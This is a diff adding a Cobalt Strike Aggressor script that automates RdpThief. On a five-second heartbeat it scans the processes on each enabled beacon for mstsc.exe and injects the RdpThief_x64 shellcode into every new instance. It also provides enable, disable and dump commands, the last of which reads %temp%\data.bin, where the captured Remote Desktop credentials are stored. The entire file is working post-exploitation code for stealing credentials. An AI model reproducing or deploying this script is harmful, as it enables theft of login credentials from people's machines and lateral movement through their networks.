@@ -1,0 +1,53 @@
+@beacons = @();
+@pids = @();
+
+on heartbeat_5s{
+
+		foreach $index => $beaconid (@beacons)
+		{
+		   
+		    bps($beaconid,&handleProcess);
+		}	
+
+}
+
+
+sub handleProcess{
+	
+	$processList = $2;
+	$index = indexOf($processList, "mstsc.exe", 0) + 9;
+
+	if($index > 9){
+
+		$temp = substr($processList,$index,-1);
+		$pid = split("\t",$temp)[2];
+
+		if ($pid !in @pids){
+			add(@pids,$pid,0);
+			blog($1,"Injecting into mstsc.exe with PID: $pid");
+			bshinject($1, $pid , "x64" ,script_resource("RdpThief_x64.tmp"));
+		}
+		
+	}
+
+
+	
+}
+
+alias rdpthief_enable {
+
+       blog($1, "RdpThief enabled \n");
+       add(@beacons,$1,0);
+
+}
+
+
+alias rdpthief_disable {
+
+       blog($1, "Disabling RdpThief");
+       remove(@beacons,$1);
+}
+alias rdpthief_dump {
+	bshell($1,"type %temp%\\data.bin")
+}
+
